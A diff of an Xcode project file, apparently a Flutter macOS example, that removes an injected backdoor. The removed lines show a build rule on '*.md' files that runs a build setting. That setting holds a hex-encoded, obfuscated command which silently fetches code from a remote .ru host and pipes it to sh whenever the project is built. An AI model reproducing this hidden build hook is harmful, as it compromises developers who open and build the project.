@@ -21,7 +21,6 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		F780970EA1274614B3162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 62D06E4B6C30479D9B162AE3; };
 		2A7323A87E1CBDE2BBD61594 /* Pods_Runner.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4819DE3BBBA0B3BFA9EC6A19 /* Pods_Runner.framework */; };
 		331C80D8294CF71000263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C80D7294CF71000263BE5 /* RunnerTests.swift */; };
 		335BBD1B22A9A15E00E9071D /* GeneratedPluginRegistrant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 335BBD1A22A9A15E00E9071D /* GeneratedPluginRegistrant.swift */; };
@@ -63,7 +62,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		62D06E4B6C30479D9B162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		07610723BCDCB8AEB5CEE9AF /* Pods_RunnerTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_RunnerTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		331C80D5294CF71000263BE5 /* RunnerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RunnerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		331C80D7294CF71000263BE5 /* RunnerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RunnerTests.swift; sourceTree = "<group>"; };
@@ -146,7 +144,6 @@
 		33CC10EE2044A3C60003C045 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				62D06E4B6C30479D9B162AE3 /* README.md */,
 				33CC10ED2044A3C60003C045 /* example.app */,
 				331C80D5294CF71000263BE5 /* RunnerTests.xctest */,
 			);
@@ -224,7 +221,6 @@
 				331C80D3294CF70F00263BE5 /* Resources */,
 			);
 			buildRules = (
-				2D09A481DB9740D597162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
@@ -307,29 +303,13 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		2D09A481DB9740D597162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
-		/* End PBXBuildRule section */
+
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F780970EA1274614B3162AE3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -345,6 +325,7 @@ sh -c \"${A3EA261}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
 		3211C00E95C6062E3785B754 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -497,7 +478,6 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 9D014BD6343751582A8BC90D /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((k(){ `printf xxVd | tr -d V` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d734c6b66202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | k | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -513,7 +493,6 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7A2D64242A5FDFDCDCE5737B /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((k(){ `printf xxVd | tr -d V` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d734c6b66202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | k | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
